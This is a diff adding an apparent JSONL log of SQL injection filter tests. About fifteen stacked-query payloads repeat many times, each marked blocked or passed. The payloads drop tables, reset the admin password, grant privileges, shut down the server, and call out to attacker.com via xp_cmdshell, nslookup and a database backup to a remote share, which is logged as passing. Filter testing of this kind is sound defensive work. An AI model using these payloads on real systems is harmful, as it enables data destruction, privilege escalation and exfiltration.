@@ -1,0 +1,300 @@
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009759324995684437}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0052182380022713915}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005108083998493385}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004811431004782207}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004470599997148383}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0040131010027835146}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042945360037265345}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004094994998013135}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003989169003034476}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012879002002591733}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0045553140007541515}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004249935002007987}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013511647004634142}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014295763001427986}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013708958998904563}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005133124002895784}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005194871002458967}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0048290000049746595}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004381924998597242}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005597070005023852}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043526939989533275}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005046966994996183}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004304438996769022}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004218763999233488}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010909210002864711}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006604710993997287}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004825408002943732}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012471474001358729}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013232445999165066}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013219840999227017}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004234555999573786}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003688869001052808}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004700525998487137}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0054648250006721355}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006369316004565917}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005724929003918078}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007589435997942928}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006081938001443632}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00446643400209723}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014407219998247456}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005133753998961765}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004390515998238698}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012370798998745158}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012773107002431061}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.0176891200026148}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007828002999303862}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006953561998670921}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0057423819962423295}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005824612002470531}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004482393000216689}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005055132998677436}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0051519389962777495}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004773025997565128}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043385850003687665}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010656591999577358}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038137599985930137}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0054268619933282025}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01184011199802626}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012394238998240326}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01691315400239546}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005646436999086291}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00514083199959714}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004695051000453532}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004907346999971196}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004522119998000562}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005102073002490215}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005772149997937959}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0039385600030072965}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003832320995570626}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011807223003415857}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0042241560004185885}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004808183002751321}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016229535001912154}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014592519000871107}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014288820995716378}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004779358001542278}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004512502004217822}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004137257004913408}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035254329995950684}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037079140020068735}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036534309983835556}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003919273003702983}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004410045003169216}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004226107004797086}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012657203995331656}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007031155997538008}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005990571997244842}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013736770997638814}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010726977998274378}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01063335700018797}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034410480002406985}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033429329996579327}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003829235000011977}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003799753001658246}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034244659982505254}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036454549990594387}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036989569998695515}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004218273003061768}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003691732999868691}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013009674999921117}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005832827002450358}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004111366004508454}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013047026994172484}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012095480000425596}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010312462000001688}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004017044004285708}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035785340005531907}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004212738000205718}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00423321699781809}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003536048003297765}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0033807520012487657}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00516635399981169}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007490294003218878}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00504596399696311}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013609795998490881}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004405977000715211}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036539299981086515}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011011257003701758}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01155518100131303}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013487800999428146}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004825296993658412}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006153021000500303}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0056283769954461604}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005669175006914884}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005123108996485826}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004891055003099609}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005035909001890104}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003937506000511348}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035571269982028753}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014038010995136574}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004019888998300303}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005495778998010792}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014463314997556154}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01467509700160008}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011699839997163508}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0035496790005709045}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003757221005798783}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003785003995290026}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003417842999624554}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005475490004755557}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005118471002788283}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004426526000315789}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004991697998775635}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006261687005462591}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.017230543002369814}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004698411998106167}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004079785001522396}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010477094998350367}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010623847003444098}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013002392995986156}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004905290996248368}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005434440994577017}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004876326995145064}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004914043995086104}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046793860019533895}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004577767998853233}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004450300999451429}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00479539499792736}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005464644003950525}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013691325999388937}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005812928000523243}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004575813996780198}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01428213799954392}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013118384005792905}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010817223999765702}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004542609996860847}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004089558002306148}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004066995999892242}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004431353998370469}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0036897710015182383}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003838577998976689}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004527615004917607}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003828423003142234}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003933697000320535}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01393450999603374}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005528399000468198}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0058093620027648285}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014857572001346853}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014807223997195251}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015847285998461302}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006084954999096226}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004639047998352908}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003645329001301434}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037926049990346655}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004995737006538548}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004789046994119417}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004044706998683978}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004718921998573933}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006278469001699705}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013674620997335296}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005838242002937477}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005093375999422278}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014464150001003873}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014224846003344283}
